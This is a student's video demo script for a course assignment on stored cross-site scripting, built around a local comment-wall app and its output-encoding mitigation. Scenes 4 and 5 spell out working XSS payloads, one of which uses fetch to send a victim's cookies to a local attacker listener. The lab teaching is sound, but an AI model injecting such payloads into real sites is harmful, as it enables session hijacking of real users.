🎬 Video Demo Script — Stored XSS
IT-30001 Cyber Security | Assignment: Web Server Security
Category: Cross-Site Scripting (XSS) — Variant: Stored XSS

NOTE

Target duration: 2–3 minutes.
What to have open before recording: Two terminal windows, one browser (with ability to open incognito), and your code editor.

PRE-RECORDING CHECKLIST
 Terminal 1 ready in Chinmay_Raheja_IIT2024164-Stored_XSS/ folder
 Terminal 2 ready in Chinmay_Raheja_IIT2024164-Stored_XSS/ folder
 Browser open (Chrome recommended)
 Code editor with server.js and views/wall.ejs open
 No leftover comments (click "Reset comments" before starting)
SCENE 1 — Introduction (~15 seconds)

🖥 Show: Your face or a title slide (optional), then switch to the browser.

🎙 Say:

"Hi, I'm [YOUR NAME], Roll Number [YOUR ROLL NUMBER]. My assigned category is Cross-Site Scripting, and I've implemented the Stored XSS variant. I'll demonstrate the vulnerability, show a working exploit with cookie theft, explain the root cause, and then show my implemented mitigation."

SCENE 2 — Start the Application (~20 seconds)

🖥 Do:

In Terminal 1, run:
bash
npm start
In Terminal 2, run:
bash
node attacker/listener.js
Open http://localhost:3000/?mode=vulnerable in the browser.

🎙 Say:

"I've built a Campus Comment Wall using Node.js and Express. Terminal 1 runs the main app on port 3000. Terminal 2 runs a separate attacker listener on port 4000 that will capture stolen cookies. I'm now opening the app in Vulnerable mode."

SCENE 3 — Show the Vulnerable Code (Requirement a) (~25 seconds)

🖥 Do: Switch to your code editor. Open views/wall.ejs and highlight lines 51–55.

🎙 Say:

"Here is the vulnerable code path. In the EJS template, when the app is in vulnerable mode, I use the raw output tag <%- c.text %> on line 52. This inserts the stored comment directly into the HTML without any encoding or sanitization. Whatever the user typed — including HTML tags and JavaScript — gets rendered as-is by the browser."

🖥 Do: Briefly show server.js line 77 (comments.push).

🎙 Say:

"And on the server side, the comment text from the form is pushed directly into the comments array with no sanitization — it's stored exactly as submitted."

SCENE 4 — Working Exploit: Proof of Execution (Requirement b) (~20 seconds)

🖥 Do:

Switch to the browser (Vulnerable mode).
In the comment form, type:
Name: Attacker
Text: <img src=x onerror=alert('Stored_XSS!')>
Click Post.
An alert box pops up. Pause for a moment so it's visible.
Click OK.

🎙 Say:

"I'll now post a malicious comment. The payload is an image tag with an invalid source. When the browser fails to load the image, the onerror handler fires and executes JavaScript — here, an alert box. This proves arbitrary script execution through a stored comment."

SCENE 5 — Working Exploit: Cookie Theft (~30 seconds)

🖥 Do:

Click Reset comments to clear the wall.
Post a new comment:
Name: Attacker
Text: <img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">
Now open a new Incognito / Private window (this simulates a different victim user).
Navigate to http://localhost:3000/?mode=vulnerable in the incognito window.
Switch to Terminal 2 — show the stolen cookie printed in the console:
🚨 Stolen cookie received!
   Cookie: session=demo-session-...; mode=vulnerable

🎙 Say:

"Now I'll demonstrate the real-world impact — cookie theft. I post a payload that uses fetch to send the victim's cookies to my attacker server on port 4000. I'll now open an incognito window to simulate a different user — a victim — visiting the same comment wall."

(After opening incognito and loading the page)

"The victim simply loaded the page, and in my attacker terminal, you can see their session cookie has been exfiltrated. This is the danger of Stored XSS — the payload persists in the database and executes for every user who views the page, not just the person who posted it."

SCENE 6 — Root Cause Explanation (Requirement c) (~15 seconds)

🖥 Do: Switch back to the code editor, show wall.ejs line 52 again.

🎙 Say:

"The root cause is straightforward: user-supplied input is stored as-is and later rendered into the HTML page without any output encoding. The browser cannot distinguish between legitimate page markup and the attacker's injected markup, so it parses and executes the injected script just like any other part of the page."

SCENE 7 — Mitigation Implemented (Requirement d) (~25 seconds)

🖥 Do:

In the code editor, highlight wall.ejs line 54: <%= c.text %>.
Switch to the browser. Click "Secure mode" in the navbar.
The existing attack payload (if any) now shows as plain text — no alert, no fetch.
Post the same payload again:
Text: <img src=x onerror=alert(document.cookie)>
It appears as literal text on the page. No alert fires.
Right-click → Inspect Element on the rendered comment to show the escaped HTML entities (&lt;img src=x onerror=...&gt;).

🎙 Say:

"My implemented mitigation is context-aware output encoding. In secure mode, I switch from the raw EJS tag <%- %> to the auto-escaping tag <%= %> on line 54. This converts HTML special characters — angle brackets, ampersands, quotes — into their HTML entity equivalents before inserting them into the page."

"I'll now post the exact same payload in Secure mode. As you can see, it renders as harmless plain text. If I inspect the element, you can see the angle brackets have been converted to &lt; and &gt;, so the browser treats it as text content, not as an HTML tag."

(Briefly show Terminal 2 — no new stolen cookie appears)

"And the attacker terminal receives nothing — the exploit is completely neutralized."

SCENE 8 — Other Mitigations: Theory (Requirement e) (~30 seconds)

🖥 Do: You can show a bullet list on screen (a slide, a text file, or just speak over the code editor).

🎙 Say:

"Besides the output encoding I implemented, the lecture covered several other mitigations for XSS:

First, framework auto-escaping — modern frameworks like React and Vue escape output by default, so developers can't accidentally forget to encode. You have to explicitly opt out with something like dangerouslySetInnerHTML.

Second, an HTML sanitizer like DOMPurify — useful when you need to allow some HTML formatting like bold or links, but want to strip dangerous tags like script and event handlers like onerror.

Third, Content Security Policy — an HTTP response header that restricts which script sources the browser will execute. Even if an inline script is injected, a strict CSP like script-src 'self' will block it from running.

Fourth, HttpOnly cookies — marking the session cookie as HttpOnly makes it invisible to JavaScript, so even if XSS succeeds, document.cookie returns nothing useful, limiting the impact.

And finally, safe DOM sinks — using textContent instead of innerHTML when inserting user data via client-side JavaScript, since textContent never parses its argument as HTML."

SCENE 9 — Closing (~10 seconds)

🎙 Say:

"To summarize: Stored XSS occurs when user input is saved and rendered without encoding. The fix is context-aware output encoding — one character of difference in the template tag, from <%- to <%=, completely prevents the attack. That concludes my portion of the demo."

QUICK REFERENCE — Timings
Scene	Content	Duration
1	Introduction	~15 sec
2	Start the app	~20 sec
3	Show vulnerable code	~25 sec
4	Exploit: alert box	~20 sec
5	Exploit: cookie theft	~30 sec
6	Root cause	~15 sec
7	Mitigation demo	~25 sec
8	Other mitigations (theory)	~30 sec
9	Closing	~10 sec
	Total	~3 min
TIPS FOR RECORDING

TIP

Zoom in your browser and terminal to at least 125–150% so text is readable in the recording.
Slow down when typing payloads — the viewer needs to read them.
Use Chrome DevTools → Inspect Element to show the escaped vs. unescaped HTML — this is very convincing visual proof.
If you stumble on a line, just pause and re-say it — you can trim silences in editing.
Keep the incognito window side-by-side with the attacker terminal for the cookie theft scene — it makes the cause-and-effect obvious.

IMPORTANT

Before recording, fill in your name and roll number in the README.md ownership table and in the script introduction above.